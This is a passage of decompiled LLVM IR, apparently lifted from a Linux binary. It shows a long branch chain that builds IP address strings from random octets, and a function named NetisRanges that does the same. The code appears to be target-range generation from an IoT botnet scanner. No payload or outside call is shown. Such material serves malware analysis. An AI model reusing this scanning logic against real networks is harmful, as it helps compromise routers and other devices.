dec_label_pc_804c6c1:                             ; preds = %dec_label_pc_804c6b8
  %v0_804c6c1 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c6c1 = zext i8 %v0_804c6c1 to i32
  store i32 %v1_804c6c1, i32* @edx, align 4
  %v0_804c6cb = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c6cb = zext i8 %v0_804c6cb to i32
  %v2_804c6da = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c6da, i32* @ebx, align 4
  %v4_804c6ec = call i32 @szprintf(i32 %v2_804c6da, i32 ptrtoint ([14 x i8]* @global_var_8059a52.214 to i32), i32 %v1_804c6cb)
  br label %dec_label_pc_804c6f1

dec_label_pc_804c6f1:                             ; preds = %dec_label_pc_804c6b8, %dec_label_pc_804c6c1
  %v13_804c6f1 = icmp eq i32 %v2_8049ce5, 196
  %v1_804c6f8 = icmp eq i1 %v13_804c6f1, false
  br i1 %v1_804c6f8, label %dec_label_pc_804c72a, label %dec_label_pc_804c6fa

dec_label_pc_804c6fa:                             ; preds = %dec_label_pc_804c6f1
  %v0_804c6fa = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c6fa = zext i8 %v0_804c6fa to i32
  store i32 %v1_804c6fa, i32* @edx, align 4
  %v0_804c704 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c704 = zext i8 %v0_804c704 to i32
  %v2_804c713 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c713, i32* @ebx, align 4
  %v4_804c725 = call i32 @szprintf(i32 %v2_804c713, i32 ptrtoint ([14 x i8]* @global_var_8059a60.215 to i32), i32 %v1_804c704)
  br label %dec_label_pc_804c72a

dec_label_pc_804c72a:                             ; preds = %dec_label_pc_804c6f1, %dec_label_pc_804c6fa
  %v13_804c72a = icmp eq i32 %v2_8049ce5, 197
  %v1_804c731 = icmp eq i1 %v13_804c72a, false
  br i1 %v1_804c731, label %dec_label_pc_804c763, label %dec_label_pc_804c733

dec_label_pc_804c733:                             ; preds = %dec_label_pc_804c72a
  %v0_804c733 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c733 = zext i8 %v0_804c733 to i32
  store i32 %v1_804c733, i32* @edx, align 4
  %v0_804c73d = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c73d = zext i8 %v0_804c73d to i32
  %v2_804c74c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c74c, i32* @ebx, align 4
  %v4_804c75e = call i32 @szprintf(i32 %v2_804c74c, i32 ptrtoint ([14 x i8]* @global_var_8059a6e.216 to i32), i32 %v1_804c73d)
  br label %dec_label_pc_804c763

dec_label_pc_804c763:                             ; preds = %dec_label_pc_804c72a, %dec_label_pc_804c733
  %v13_804c763 = icmp eq i32 %v2_8049ce5, 198
  %v1_804c76a = icmp eq i1 %v13_804c763, false
  br i1 %v1_804c76a, label %dec_label_pc_804c79c, label %dec_label_pc_804c76c

dec_label_pc_804c76c:                             ; preds = %dec_label_pc_804c763
  %v0_804c76c = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c76c = zext i8 %v0_804c76c to i32
  store i32 %v1_804c76c, i32* @edx, align 4
  %v0_804c776 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c776 = zext i8 %v0_804c776 to i32
  %v2_804c785 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c785, i32* @ebx, align 4
  %v4_804c797 = call i32 @szprintf(i32 %v2_804c785, i32 ptrtoint ([14 x i8]* @global_var_8059a7c.217 to i32), i32 %v1_804c776)
  br label %dec_label_pc_804c79c

dec_label_pc_804c79c:                             ; preds = %dec_label_pc_804c763, %dec_label_pc_804c76c
  %v13_804c79c = icmp eq i32 %v2_8049ce5, 199
  %v1_804c7a3 = icmp eq i1 %v13_804c79c, false
  br i1 %v1_804c7a3, label %dec_label_pc_804c7d5, label %dec_label_pc_804c7a5

dec_label_pc_804c7a5:                             ; preds = %dec_label_pc_804c79c
  %v0_804c7a5 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c7a5 = zext i8 %v0_804c7a5 to i32
  store i32 %v1_804c7a5, i32* @edx, align 4
  %v0_804c7af = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c7af = zext i8 %v0_804c7af to i32
  %v2_804c7be = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c7be, i32* @ebx, align 4
  %v4_804c7d0 = call i32 @szprintf(i32 %v2_804c7be, i32 ptrtoint ([14 x i8]* @global_var_8059a8a.218 to i32), i32 %v1_804c7af)
  br label %dec_label_pc_804c7d5

dec_label_pc_804c7d5:                             ; preds = %dec_label_pc_804c79c, %dec_label_pc_804c7a5
  %v13_804c7d5 = icmp eq i32 %v2_8049ce5, 200
  %v1_804c7dc = icmp eq i1 %v13_804c7d5, false
  br i1 %v1_804c7dc, label %dec_label_pc_804c80e, label %dec_label_pc_804c7de

dec_label_pc_804c7de:                             ; preds = %dec_label_pc_804c7d5
  %v0_804c7de = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c7de = zext i8 %v0_804c7de to i32
  store i32 %v1_804c7de, i32* @edx, align 4
  %v0_804c7e8 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c7e8 = zext i8 %v0_804c7e8 to i32
  %v2_804c7f7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c7f7, i32* @ebx, align 4
  %v4_804c809 = call i32 @szprintf(i32 %v2_804c7f7, i32 ptrtoint ([14 x i8]* @global_var_8059a98.219 to i32), i32 %v1_804c7e8)
  br label %dec_label_pc_804c80e

dec_label_pc_804c80e:                             ; preds = %dec_label_pc_804c7d5, %dec_label_pc_804c7de
  %v13_804c80e = icmp eq i32 %v2_8049ce5, 201
  %v1_804c815 = icmp eq i1 %v13_804c80e, false
  br i1 %v1_804c815, label %dec_label_pc_804c847.thread, label %dec_label_pc_804c850

dec_label_pc_804c847.thread:                      ; preds = %dec_label_pc_804c80e
  br label %dec_label_pc_804c880

dec_label_pc_804c850:                             ; preds = %dec_label_pc_804c80e
  %v0_804c821 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c821 = zext i8 %v0_804c821 to i32
  %v2_804c830 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c830, i32* @ebx, align 4
  %v4_804c842 = call i32 @szprintf(i32 %v2_804c830, i32 ptrtoint ([14 x i8]* @global_var_8059aa6.220 to i32), i32 %v1_804c821)
  %v0_804c850 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c850 = zext i8 %v0_804c850 to i32
  store i32 %v1_804c850, i32* @edx, align 4
  %v0_804c85a = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c85a = zext i8 %v0_804c85a to i32
  store i32 %v2_804c830, i32* @ebx, align 4
  %v4_804c87b = call i32 @szprintf(i32 %v2_804c830, i32 ptrtoint ([13 x i8]* @global_var_8059ab4.221 to i32), i32 %v1_804c85a)
  br label %dec_label_pc_804c880

dec_label_pc_804c880:                             ; preds = %dec_label_pc_804c847.thread, %dec_label_pc_804c850
  %v13_804c880 = icmp eq i32 %v2_8049ce5, 202
  %v1_804c887 = icmp eq i1 %v13_804c880, false
  br i1 %v1_804c887, label %dec_label_pc_804c8b9, label %dec_label_pc_804c889

dec_label_pc_804c889:                             ; preds = %dec_label_pc_804c880
  %v0_804c889 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c889 = zext i8 %v0_804c889 to i32
  store i32 %v1_804c889, i32* @edx, align 4
  %v0_804c893 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c893 = zext i8 %v0_804c893 to i32
  %v2_804c8a2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c8a2, i32* @ebx, align 4
  %v4_804c8b4 = call i32 @szprintf(i32 %v2_804c8a2, i32 ptrtoint ([13 x i8]* @global_var_8059ac1.222 to i32), i32 %v1_804c893)
  br label %dec_label_pc_804c8b9

dec_label_pc_804c8b9:                             ; preds = %dec_label_pc_804c880, %dec_label_pc_804c889
  %v13_804c8b9 = icmp eq i32 %v2_8049ce5, 203
  %v1_804c8c0 = icmp eq i1 %v13_804c8b9, false
  br i1 %v1_804c8c0, label %dec_label_pc_804c8f2, label %dec_label_pc_804c8c2

dec_label_pc_804c8c2:                             ; preds = %dec_label_pc_804c8b9
  %v0_804c8c2 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c8c2 = zext i8 %v0_804c8c2 to i32
  store i32 %v1_804c8c2, i32* @edx, align 4
  %v0_804c8cc = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c8cc = zext i8 %v0_804c8cc to i32
  %v2_804c8db = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c8db, i32* @ebx, align 4
  %v4_804c8ed = call i32 @szprintf(i32 %v2_804c8db, i32 ptrtoint ([13 x i8]* @global_var_8059ace.223 to i32), i32 %v1_804c8cc)
  br label %dec_label_pc_804c8f2

dec_label_pc_804c8f2:                             ; preds = %dec_label_pc_804c8b9, %dec_label_pc_804c8c2
  %v13_804c8f2 = icmp eq i32 %v2_8049ce5, 204
  %v1_804c8f9 = icmp eq i1 %v13_804c8f2, false
  br i1 %v1_804c8f9, label %dec_label_pc_804c92b, label %dec_label_pc_804c8fb

dec_label_pc_804c8fb:                             ; preds = %dec_label_pc_804c8f2
  %v0_804c8fb = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c8fb = zext i8 %v0_804c8fb to i32
  store i32 %v1_804c8fb, i32* @edx, align 4
  %v0_804c905 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c905 = zext i8 %v0_804c905 to i32
  %v2_804c914 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c914, i32* @ebx, align 4
  %v4_804c926 = call i32 @szprintf(i32 %v2_804c914, i32 ptrtoint ([13 x i8]* @global_var_8059adb.224 to i32), i32 %v1_804c905)
  br label %dec_label_pc_804c92b

dec_label_pc_804c92b:                             ; preds = %dec_label_pc_804c8f2, %dec_label_pc_804c8fb
  %v13_804c92b = icmp eq i32 %v2_8049ce5, 205
  %v1_804c932 = icmp eq i1 %v13_804c92b, false
  br i1 %v1_804c932, label %dec_label_pc_804c964, label %dec_label_pc_804c934

dec_label_pc_804c934:                             ; preds = %dec_label_pc_804c92b
  %v0_804c934 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c934 = zext i8 %v0_804c934 to i32
  store i32 %v1_804c934, i32* @edx, align 4
  %v0_804c93e = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c93e = zext i8 %v0_804c93e to i32
  %v2_804c94d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c94d, i32* @ebx, align 4
  %v4_804c95f = call i32 @szprintf(i32 %v2_804c94d, i32 ptrtoint ([13 x i8]* @global_var_8059ae8.225 to i32), i32 %v1_804c93e)
  br label %dec_label_pc_804c964

dec_label_pc_804c964:                             ; preds = %dec_label_pc_804c92b, %dec_label_pc_804c934
  %v13_804c964 = icmp eq i32 %v2_8049ce5, 206
  %v1_804c96b = icmp eq i1 %v13_804c964, false
  br i1 %v1_804c96b, label %dec_label_pc_804c99d, label %dec_label_pc_804c96d

dec_label_pc_804c96d:                             ; preds = %dec_label_pc_804c964
  %v0_804c96d = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c96d = zext i8 %v0_804c96d to i32
  store i32 %v1_804c96d, i32* @edx, align 4
  %v0_804c977 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c977 = zext i8 %v0_804c977 to i32
  %v2_804c986 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c986, i32* @ebx, align 4
  %v4_804c998 = call i32 @szprintf(i32 %v2_804c986, i32 ptrtoint ([13 x i8]* @global_var_8059af5.226 to i32), i32 %v1_804c977)
  br label %dec_label_pc_804c99d

dec_label_pc_804c99d:                             ; preds = %dec_label_pc_804c964, %dec_label_pc_804c96d
  %v13_804c99d = icmp eq i32 %v2_8049ce5, 207
  %v1_804c9a4 = icmp eq i1 %v13_804c99d, false
  br i1 %v1_804c9a4, label %dec_label_pc_804c9d6, label %dec_label_pc_804c9a6

dec_label_pc_804c9a6:                             ; preds = %dec_label_pc_804c99d
  %v0_804c9a6 = load i8, i8* @global_var_805e49a.30, align 2
  %v1_804c9a6 = zext i8 %v0_804c9a6 to i32
  store i32 %v1_804c9a6, i32* @edx, align 4
  %v0_804c9b0 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804c9b0 = zext i8 %v0_804c9b0 to i32
  %v2_804c9bf = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c9bf, i32* @ebx, align 4
  %v4_804c9d1 = call i32 @szprintf(i32 %v2_804c9bf, i32 ptrtoint ([14 x i8]* @global_var_8059b02.227 to i32), i32 %v1_804c9b0)
  br label %dec_label_pc_804c9d6

dec_label_pc_804c9d6:                             ; preds = %dec_label_pc_804c99d, %dec_label_pc_804c9a6
  br i1 true, label %dec_label_pc_804c9d6.dec_label_pc_804ca0f_crit_edge, label %dec_label_pc_804c9df

dec_label_pc_804c9d6.dec_label_pc_804ca0f_crit_edge: ; preds = %dec_label_pc_804c9d6
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_804ca0f

dec_label_pc_804c9df:                             ; preds = %dec_label_pc_804c9d6
  br label %dec_label_pc_804ca0f

dec_label_pc_804ca0f:                             ; preds = %dec_label_pc_804c9d6.dec_label_pc_804ca0f_crit_edge, %dec_label_pc_804c9df
  %v2_804ca0f.pre-phi = phi i32 [ %.pre, %dec_label_pc_804c9d6.dec_label_pc_804ca0f_crit_edge ], [ undef, %dec_label_pc_804c9df ]
  %v1_804ca15 = call i32 @inet_addr(i32 %v2_804ca0f.pre-phi)
  %v2_804ca1d = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804ca1d, i32* @ebx, align 4
  ret i32 %v1_804ca15

; uselistorder directives
  uselistorder i32 %v2_804c830, { 1, 0, 2, 3 }
  uselistorder i32 %v2_8049cba, { 1, 0 }
  uselistorder i32 %v2_8049c7a, { 1, 0 }
  uselistorder i32 %v2_8049c3a, { 1, 0 }
  uselistorder i32 %v2_8049bfa, { 1, 0 }
  uselistorder label %dec_label_pc_804ca0f, { 1, 0 }
  uselistorder label %dec_label_pc_804c9d6, { 1, 0 }
  uselistorder label %dec_label_pc_804c99d, { 1, 0 }
  uselistorder label %dec_label_pc_804c964, { 1, 0 }
  uselistorder label %dec_label_pc_804c92b, { 1, 0 }
  uselistorder label %dec_label_pc_804c8f2, { 1, 0 }
  uselistorder label %dec_label_pc_804c8b9, { 1, 0 }
  uselistorder label %dec_label_pc_804c880, { 1, 0 }
  uselistorder label %dec_label_pc_804c80e, { 1, 0 }
  uselistorder label %dec_label_pc_804c7d5, { 1, 0 }
  uselistorder label %dec_label_pc_804c79c, { 1, 0 }
  uselistorder label %dec_label_pc_804c763, { 1, 0 }
  uselistorder label %dec_label_pc_804c72a, { 1, 0 }
  uselistorder label %dec_label_pc_804c6f1, { 1, 0 }
  uselistorder label %dec_label_pc_804c6b8, { 1, 0 }
  uselistorder label %dec_label_pc_804c67f, { 1, 0 }
  uselistorder label %dec_label_pc_804c646, { 1, 0 }
  uselistorder label %dec_label_pc_804c60d, { 1, 0 }
  uselistorder label %dec_label_pc_804c5d4, { 1, 0 }
  uselistorder label %dec_label_pc_804c59b, { 1, 0 }
  uselistorder label %dec_label_pc_804c562, { 1, 0 }
  uselistorder label %dec_label_pc_804c529, { 1, 0 }
  uselistorder label %dec_label_pc_804c4f0, { 1, 0 }
  uselistorder label %dec_label_pc_804c4b7, { 1, 0 }
  uselistorder label %dec_label_pc_804c47e, { 1, 0 }
  uselistorder label %dec_label_pc_804c445, { 1, 0 }
  uselistorder label %dec_label_pc_804c40c, { 1, 0 }
  uselistorder label %dec_label_pc_804c3d3, { 1, 0 }
  uselistorder label %dec_label_pc_804c39a, { 1, 0 }
  uselistorder label %dec_label_pc_804c361, { 1, 0 }
  uselistorder label %dec_label_pc_804c328, { 1, 0 }
  uselistorder label %dec_label_pc_804c2ef, { 1, 0 }
  uselistorder label %dec_label_pc_804c2b6, { 1, 0 }
  uselistorder label %dec_label_pc_804c27d, { 1, 0 }
  uselistorder label %dec_label_pc_804c244, { 1, 0 }
  uselistorder label %dec_label_pc_804c20b, { 1, 0 }
  uselistorder label %dec_label_pc_804c1d2, { 1, 0 }
  uselistorder label %dec_label_pc_804c199, { 1, 0 }
  uselistorder label %dec_label_pc_804c160, { 1, 0 }
  uselistorder label %dec_label_pc_804c127, { 1, 0 }
  uselistorder label %dec_label_pc_804c0ee, { 1, 0 }
  uselistorder label %dec_label_pc_804c0b5, { 1, 0 }
  uselistorder label %dec_label_pc_804c07c, { 1, 0 }
  uselistorder label %dec_label_pc_804c043, { 1, 0 }
  uselistorder label %dec_label_pc_804c00a, { 1, 0 }
  uselistorder label %dec_label_pc_804bfd1, { 1, 0 }
  uselistorder label %dec_label_pc_804bf98, { 1, 0 }
  uselistorder label %dec_label_pc_804bf5f, { 1, 0 }
  uselistorder label %dec_label_pc_804bf26, { 1, 0 }
  uselistorder label %dec_label_pc_804beed, { 1, 0 }
  uselistorder label %dec_label_pc_804beb4, { 1, 0 }
  uselistorder label %dec_label_pc_804be7b, { 1, 0 }
  uselistorder label %dec_label_pc_804be42, { 1, 0 }
  uselistorder label %dec_label_pc_804be09, { 1, 0 }
  uselistorder label %dec_label_pc_804bdd0, { 1, 0 }
  uselistorder label %dec_label_pc_804bd97, { 1, 0 }
  uselistorder label %dec_label_pc_804bd5e, { 1, 0 }
  uselistorder label %dec_label_pc_804bd25, { 1, 0 }
  uselistorder label %dec_label_pc_804bcec, { 1, 0 }
  uselistorder label %dec_label_pc_804bcb3, { 1, 0 }
  uselistorder label %dec_label_pc_804bc7a, { 1, 0 }
  uselistorder label %dec_label_pc_804bc41, { 1, 0 }
  uselistorder label %dec_label_pc_804bc08, { 1, 0 }
  uselistorder label %dec_label_pc_804bbcf, { 1, 0 }
  uselistorder label %dec_label_pc_804bb96, { 1, 0 }
  uselistorder label %dec_label_pc_804bb5d, { 1, 0 }
  uselistorder label %dec_label_pc_804bb24, { 1, 0 }
  uselistorder label %dec_label_pc_804baeb, { 1, 0 }
  uselistorder label %dec_label_pc_804bab2, { 1, 0 }
  uselistorder label %dec_label_pc_804ba79, { 1, 0 }
  uselistorder label %dec_label_pc_804ba40, { 1, 0 }
  uselistorder label %dec_label_pc_804ba07, { 1, 0 }
  uselistorder label %dec_label_pc_804b9ce, { 1, 0 }
  uselistorder label %dec_label_pc_804b995, { 1, 0 }
  uselistorder label %dec_label_pc_804b95c, { 1, 0 }
  uselistorder label %dec_label_pc_804b923, { 1, 0 }
  uselistorder label %dec_label_pc_804b8ea, { 1, 0 }
  uselistorder label %dec_label_pc_804b8b1, { 1, 0 }
  uselistorder label %dec_label_pc_804b878, { 1, 0 }
  uselistorder label %dec_label_pc_804b83f, { 1, 0 }
  uselistorder label %dec_label_pc_804b806, { 1, 0 }
  uselistorder label %dec_label_pc_804b7d0, { 1, 0 }
  uselistorder label %dec_label_pc_804b79a, { 1, 0 }
  uselistorder label %dec_label_pc_804b764, { 1, 0 }
  uselistorder label %dec_label_pc_804b72e, { 1, 0 }
  uselistorder label %dec_label_pc_804b6f8, { 1, 0 }
  uselistorder label %dec_label_pc_804b6c2, { 1, 0 }
  uselistorder label %dec_label_pc_804b68c, { 1, 0 }
  uselistorder label %dec_label_pc_804b656, { 1, 0 }
  uselistorder label %dec_label_pc_804b620, { 1, 0 }
  uselistorder label %dec_label_pc_804b5ea, { 1, 0 }
  uselistorder label %dec_label_pc_804b5b4, { 1, 0 }
  uselistorder label %dec_label_pc_804b57e, { 1, 0 }
  uselistorder label %dec_label_pc_804b548, { 1, 0 }
  uselistorder label %dec_label_pc_804b512, { 1, 0 }
  uselistorder label %dec_label_pc_804b4dc, { 1, 0 }
  uselistorder label %dec_label_pc_804b4a6, { 1, 0 }
  uselistorder label %dec_label_pc_804b470, { 1, 0 }
  uselistorder label %dec_label_pc_804b43a, { 1, 0 }
  uselistorder label %dec_label_pc_804b404, { 1, 0 }
  uselistorder label %dec_label_pc_804b3ce, { 1, 0 }
  uselistorder label %dec_label_pc_804b398, { 1, 0 }
  uselistorder label %dec_label_pc_804b362, { 1, 0 }
  uselistorder label %dec_label_pc_804b32c, { 1, 0 }
  uselistorder label %dec_label_pc_804b2f6, { 1, 0 }
  uselistorder label %dec_label_pc_804b2c0, { 1, 0 }
  uselistorder label %dec_label_pc_804b28a, { 1, 0 }
  uselistorder label %dec_label_pc_804b254, { 1, 0 }
  uselistorder label %dec_label_pc_804b21e, { 1, 0 }
  uselistorder label %dec_label_pc_804b1e8, { 1, 0 }
  uselistorder label %dec_label_pc_804b1b2, { 1, 0 }
  uselistorder label %dec_label_pc_804b17c, { 1, 0 }
  uselistorder label %dec_label_pc_804b146, { 1, 0 }
  uselistorder label %dec_label_pc_804b110, { 1, 0 }
  uselistorder label %dec_label_pc_804b0da, { 1, 0 }
  uselistorder label %dec_label_pc_804b0a4, { 1, 0 }
  uselistorder label %dec_label_pc_804b06e, { 1, 0 }
  uselistorder label %dec_label_pc_804b038, { 1, 0 }
  uselistorder label %dec_label_pc_804b002, { 1, 0 }
  uselistorder label %dec_label_pc_804afcc, { 1, 0 }
  uselistorder label %dec_label_pc_804af96, { 1, 0 }
  uselistorder label %dec_label_pc_804af60, { 1, 0 }
  uselistorder label %dec_label_pc_804af2a, { 1, 0 }
  uselistorder label %dec_label_pc_804aef4, { 1, 0 }
  uselistorder label %dec_label_pc_804aebe, { 1, 0 }
  uselistorder label %dec_label_pc_804ae88, { 1, 0 }
  uselistorder label %dec_label_pc_804ae52, { 1, 0 }
  uselistorder label %dec_label_pc_804ae1c, { 1, 0 }
  uselistorder label %dec_label_pc_804ade6, { 1, 0 }
  uselistorder label %dec_label_pc_804adb0, { 1, 0 }
  uselistorder label %dec_label_pc_804ad7a, { 1, 0 }
  uselistorder label %dec_label_pc_804ad44, { 1, 0 }
  uselistorder label %dec_label_pc_804ad0e, { 1, 0 }
  uselistorder label %dec_label_pc_804acd8, { 1, 0 }
  uselistorder label %dec_label_pc_804aca2, { 1, 0 }
  uselistorder label %dec_label_pc_804ac6c, { 1, 0 }
  uselistorder label %dec_label_pc_804ac36, { 1, 0 }
  uselistorder label %dec_label_pc_804ac00, { 1, 0 }
  uselistorder label %dec_label_pc_804abca, { 1, 0 }
  uselistorder label %dec_label_pc_804ab94, { 1, 0 }
  uselistorder label %dec_label_pc_804ab5e, { 1, 0 }
  uselistorder label %dec_label_pc_804ab28, { 1, 0 }
  uselistorder label %dec_label_pc_804aaf2, { 1, 0 }
  uselistorder label %dec_label_pc_804aabc, { 1, 0 }
  uselistorder label %dec_label_pc_804aa86, { 1, 0 }
  uselistorder label %dec_label_pc_804aa50, { 1, 0 }
  uselistorder label %dec_label_pc_804aa1a, { 1, 0 }
  uselistorder label %dec_label_pc_804a9e4, { 1, 0 }
  uselistorder label %dec_label_pc_804a9ae, { 1, 0 }
  uselistorder label %dec_label_pc_804a978, { 1, 0 }
  uselistorder label %dec_label_pc_804a942, { 1, 0 }
  uselistorder label %dec_label_pc_804a90c, { 1, 0 }
  uselistorder label %dec_label_pc_804a8d6, { 1, 0 }
  uselistorder label %dec_label_pc_804a8a0, { 1, 0 }
  uselistorder label %dec_label_pc_804a86a, { 1, 0 }
  uselistorder label %dec_label_pc_804a834, { 1, 0 }
  uselistorder label %dec_label_pc_804a7fe, { 1, 0 }
  uselistorder label %dec_label_pc_804a7c8, { 1, 0 }
  uselistorder label %dec_label_pc_804a792, { 1, 0 }
  uselistorder label %dec_label_pc_804a75c, { 1, 0 }
  uselistorder label %dec_label_pc_804a726, { 1, 0 }
  uselistorder label %dec_label_pc_804a6f0, { 1, 0 }
  uselistorder label %dec_label_pc_804a6ba, { 1, 0 }
  uselistorder label %dec_label_pc_804a684, { 1, 0 }
  uselistorder label %dec_label_pc_804a64e, { 1, 0 }
  uselistorder label %dec_label_pc_804a618, { 1, 0 }
  uselistorder label %dec_label_pc_804a5e2, { 1, 0 }
  uselistorder label %dec_label_pc_804a5ac, { 1, 0 }
  uselistorder label %dec_label_pc_804a576, { 1, 0 }
  uselistorder label %dec_label_pc_804a540, { 1, 0 }
  uselistorder label %dec_label_pc_804a50a, { 1, 0 }
  uselistorder label %dec_label_pc_804a4d4, { 1, 0 }
  uselistorder label %dec_label_pc_804a49e, { 1, 0 }
  uselistorder label %dec_label_pc_804a468, { 1, 0 }
  uselistorder label %dec_label_pc_804a432, { 1, 0 }
  uselistorder label %dec_label_pc_804a3fc, { 1, 0 }
  uselistorder label %dec_label_pc_804a3c6, { 1, 0 }
  uselistorder label %dec_label_pc_804a390, { 1, 0 }
  uselistorder label %dec_label_pc_804a35a, { 1, 0 }
  uselistorder label %dec_label_pc_804a324, { 1, 0 }
  uselistorder label %dec_label_pc_804a2ee, { 1, 0 }
  uselistorder label %dec_label_pc_804a2b8, { 1, 0 }
  uselistorder label %dec_label_pc_804a282, { 1, 0 }
  uselistorder label %dec_label_pc_804a24c, { 1, 0 }
  uselistorder label %dec_label_pc_804a216, { 1, 0 }
  uselistorder label %dec_label_pc_804a1e0, { 1, 0 }
  uselistorder label %dec_label_pc_804a1aa, { 1, 0 }
  uselistorder label %dec_label_pc_804a174, { 1, 0 }
  uselistorder label %dec_label_pc_804a13e, { 1, 0 }
  uselistorder label %dec_label_pc_804a108, { 1, 0 }
  uselistorder label %dec_label_pc_804a0d2, { 1, 0 }
  uselistorder label %dec_label_pc_804a09c, { 1, 0 }
  uselistorder label %dec_label_pc_804a066, { 1, 0 }
  uselistorder label %dec_label_pc_804a030, { 1, 0 }
  uselistorder label %dec_label_pc_8049ffa, { 1, 0 }
  uselistorder label %dec_label_pc_8049fc4, { 1, 0 }
  uselistorder label %dec_label_pc_8049f8e, { 1, 0 }
  uselistorder label %dec_label_pc_8049f58, { 1, 0 }
  uselistorder label %dec_label_pc_8049f22, { 1, 0 }
  uselistorder label %dec_label_pc_8049eec, { 1, 0 }
  uselistorder label %dec_label_pc_8049eb6, { 1, 0 }
  uselistorder label %dec_label_pc_8049e80, { 1, 0 }
  uselistorder label %dec_label_pc_8049e4a, { 1, 0 }
  uselistorder label %dec_label_pc_8049e14, { 1, 0 }
  uselistorder label %dec_label_pc_8049dde, { 1, 0 }
  uselistorder label %dec_label_pc_8049da8, { 1, 0 }
  uselistorder label %dec_label_pc_8049d72, { 1, 0 }
  uselistorder label %dec_label_pc_8049d3c, { 1, 0 }
}

define i32 @NetisRanges(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ca23 = load i32, i32* @edi, align 4
  %v0_804ca24 = load i32, i32* @esi, align 4
  %v0_804ca25 = load i32, i32* @ebx, align 4
  store i32 %v0_804ca25, i32* %stack_var_-16, align 4
  %v1_804ca29 = call i32 @random()
  %v2_804ca47 = urem i32 %v1_804ca29, 57
  store i32 %v2_804ca47, i32* @ebx, align 4
  %v1_804ca6c = mul nuw nsw i32 %v2_804ca47, 4
  %v2_804ca6c = add nuw nsw i32 %v1_804ca6c, 134603008
  %v3_804ca6c = inttoptr i32 %v2_804ca6c to i32*
  %v4_804ca6c = load i32, i32* %v3_804ca6c, align 4
  store i32 %v4_804ca6c, i32* @eax, align 4
  %v1_804ca73 = trunc i32 %v4_804ca6c to i8
  store i8 %v1_804ca73, i8* @global_var_805e497.27, align 1
  %v1_804ca78 = call i32 @random()
  %v2_804ca9a = sdiv i32 %v1_804ca78, 51
  store i32 %v2_804ca9a, i32* @ebx, align 4
  %tmp = mul i32 %v2_804ca9a, -255
  %v2_804caaa = add i32 %v1_804ca78, %tmp
  %v14_804caaa = trunc i32 %v2_804caaa to i8
  store i32 %v2_804caaa, i32* @eax, align 4
  store i8 %v14_804caaa, i8* @global_var_805e498.28, align 8
  %v1_804cab8 = call i32 @random()
  %v2_804cada = sdiv i32 %v1_804cab8, 51
  store i32 %v2_804cada, i32* @ebx, align 4
  %tmp29 = mul i32 %v2_804cada, -255
  %v2_804caea = add i32 %v1_804cab8, %tmp29
  %v14_804caea = trunc i32 %v2_804caea to i8
  store i32 %v2_804caea, i32* @eax, align 4
  store i8 %v14_804caea, i8* @global_var_805e499.29, align 1
  %v1_804caf8 = call i32 @random()
  %v2_804cb1a = sdiv i32 %v1_804caf8, 51
  %tmp30 = mul i32 %v2_804cb1a, -255
  %v2_804cb2a = add i32 %v1_804caf8, %tmp30
  %v14_804cb2a = trunc i32 %v2_804cb2a to i8
  store i8 %v14_804cb2a, i8* @global_var_805e49a.30, align 2
  store i32 0, i32* %stack_var_-36, align 4
  %v0_804cb54 = load i8, i8* @global_var_805e499.29, align 1
  %v1_804cb54 = zext i8 %v0_804cb54 to i32
  store i32 %v1_804cb54, i32* @edx, align 4
  %v0_804cb68 = load i8, i8* @global_var_805e497.27, align 1
  %v1_804cb68 = zext i8 %v0_804cb68 to i32
  store i32 %v1_804cb68, i32* @ebx, align 4
  %v0_804cb72 = load i8, i8* @global_var_805e496.229, align 2
  %v1_804cb72 = zext i8 %v0_804cb72 to i32
  %v2_804cb81 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_804cb81, i32* @edi, align 4
  %v4_804cb9b = call i32 @szprintf(i32 %v2_804cb81, i32 ptrtoint ([12 x i8]* @global_var_8059b1d.230 to i32), i32 %v1_804cb72)
  %v1_804cba6 = call i32 @inet_addr(i32 %v2_804cb81)
  %v2_804cbae = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804cbae, i32* @ebx, align 4
  store i32 %v0_804ca24, i32* @esi, align 4
